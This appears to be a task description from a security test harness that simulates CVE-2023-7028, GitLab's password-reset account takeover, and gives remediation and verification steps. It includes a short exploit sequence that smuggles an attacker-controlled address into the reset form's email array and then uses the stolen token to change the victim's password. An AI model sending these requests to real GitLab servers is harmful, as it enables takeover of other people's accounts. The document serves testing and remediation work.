# GitLab Password-Reset Account Takeover (CVE-2023-7028, simulated)

## Severity
**Critical** (CVSS 10.0)

## CVE / CWE
- CVE-2023-7028
- CWE-640: Weak Password Recovery Mechanism

## Description
GitLab CE/EE 16.1.0–16.7.1 (across several point releases) accept an array of
addresses in the `user[email]` parameter of the password-reset form and deliver
the reset link to ALL of them. An unauthenticated attacker who lists a target's
address alongside one they control receives a working reset token, yielding full
account takeover — including `root`. Over 5,300 internet-exposed instances were
vulnerable at disclosure.

## This scenario is a SIMULATION
A real GitLab omnibus upgrade far exceeds the harness timeouts, so this scenario
runs a faithful **Python/Flask simulation** on port 80 that reproduces the
CVE's actual takeover primitive: the reset handler delivers the reset token to
every address in an attacker-supplied `user[email][]` array, and the token can
then be used to change the victim's password (**real state change**). It is a
simulation of CVE-2023-7028, not a real GitLab server.

Exploit (unauthenticated):
```
POST /users/password   user[email][]=victim@x  user[email][]=attacker@evil
# read the token from the attacker's own mailbox, then:
POST /users/password   token=<stolen>  user[password]=<new>
# log in as the victim with the new password
```

## Affected Service
- **Service:** GitLab CE 16.7.0 (simulated with Python/Flask)
- **Ports:** 80/TCP

## Remediation Steps (in-container fix)
1. Reject array/multiple recipients in the reset handler (strict parameter
   typing), matching GitLab's fix. In the sim, set
   `ALLOW_MULTI_EMAIL_RESET = False` in `/opt/gitlab/app.py`, e.g.:
   ```
   sed -i 's/^ALLOW_MULTI_EMAIL_RESET = True/ALLOW_MULTI_EMAIL_RESET = False/' /opt/gitlab/app.py
   ```
2. **Restart** the service so the running process loads the fix (the sim boots
   on 0.0.0.0:80 in the background; a fix that is not restarted leaves the old
   vulnerable process running).
3. Verify: the array-recipient reset is rejected, the attacker receives no
   token, and the victim's password is unchanged.
4. Regression: a legitimate single-address reset still delivers to the account
   owner and `/users/sign_in` still works.
